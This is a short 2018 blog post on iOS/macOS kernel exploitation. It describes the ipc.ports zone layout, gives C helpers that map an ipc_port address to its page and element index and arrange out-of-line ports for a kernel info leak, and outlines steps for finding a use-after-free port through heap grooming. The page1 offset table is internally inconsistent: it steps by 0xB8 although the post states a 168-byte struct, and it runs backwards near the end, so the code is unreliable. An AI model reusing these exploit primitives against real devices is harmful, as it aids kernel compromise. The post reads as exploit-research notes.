---
layout: post
title:  "About ipc.ports zone"
date:   2018-08-20
categories: ios macos exploitation
---

# Basics
* The size of `struct ipc_port` is 168. 
* The size of kalloc is 4096 * (3 or 4).

# No offset collision
There is no offset collision in one kalloc, so if you can get the offset of a `ipc_port`, you can get the port index and page index.

```c
uint64_t PRTS_GetPageAndElementInfo(uint64_t kObjAddr)
{
    static uint32_t page0[25] = {
        0x000, 0x0A8, 0x150, 0x1F8, 0x2A0, 0x348, 0x3F0, 0x498, 0x540, 0x5E8,
        0x690, 0x738, 0x7E0, 0x888, 0x930, 0x9D8, 0xA80, 0xB28, 0xBD0, 0xC78,
        0xD20, 0xDC8, 0xE70, 0xF18, 0xFC0
    };
    
    static uint32_t page1[25] = {
        0x058, 0x110, 0x1C8, 0x280, 0x338, 0x3F0, 0x4A8, 0x560, 0x618, 0x6D0,
        0x788, 0x840, 0x8F8, 0x9B0, 0xA68, 0xB20, 0xBD8, 0xC90, 0xD48, 0xE00,
        0xEB8, 0xE30, 0xED8, 0xF80, 0xFFF
    };
    
    static uint32_t page2[25] = {
        0x028, 0x0D0, 0x178, 0x220, 0x2C8, 0x370, 0x418, 0x4C0, 0x568, 0x610,
        0x6B8, 0x760, 0x808, 0x8B0, 0x958, 0xA00, 0xAA8, 0xB50, 0xBF8, 0xCA0,
        0xD48, 0xDF0, 0xE98, 0xF40, 0xFFF
    };
    
    static uint32_t* pages[] = {
        page0, page1, page2
    };
    
    uint32_t offset = kObjAddr & 0xFFF;
    
    int pgCnt = sizeof(pages) / sizeof(uint32_t *);
    int itemCnt = sizeof(page0) / sizeof(uint32_t);
    for (int pgIdx = 0; pgIdx < pgCnt; ++pgIdx) {
        for (int objIdx = 0; objIdx < itemCnt; ++objIdx) {
            if (pages[pgIdx][objIdx] == offset) {
                return ((uint64_t)pgIdx << 32) | objIdx;
            }
        }
    }
    
    return -1;
}
```

# Info leak by ool ports
Should pay attention to port layout.

```c
void PRTS_LayoutPorts(mach_port_t *payloadObjs, int portCnt, mach_port_t infoLeakPort)
{
    static const int step = (PRTS_PAGE_SIZE / PRTS_PORT_SIZE) + 1;
    static const int ctxOffset = (PRTS_PORT_CTX_OFFSET / 8);
    
    // page: 1
    for (int idx = 0; idx < portCnt; idx += step) {
        payloadObjs[idx + ctxOffset] = infoLeakPort;
    }
    
    // page: 2
    payloadObjs[10] = infoLeakPort;
    for (int idx = 13; idx < portCnt; idx += step) {
        payloadObjs[idx + ctxOffset] = infoLeakPort;
    }
    
    // page: 3
    payloadObjs[2] = infoLeakPort;
    for (int idx = 5; idx < portCnt; idx += step) {
        payloadObjs[idx + ctxOffset] = infoLeakPort;
    }
}
```

# How to get UaF port address
* By filling the gap, you can get 2 kalloc with continuous address.
* Place the UaF port in the 1st kalloc, place the info leak port in the 2nd kalloc.
* With ool ports, you can get the address of info leak port.
* With the address of info leak port, you can call `PRTS_GetPageAndElementInfo`.
* With the info of 2nd kalloc, you can get the address range of 1st kalloc.
* If you can get the offset of UaF port, you can get the info of 1st kalloc.
* With GC, you can control 3 pages.
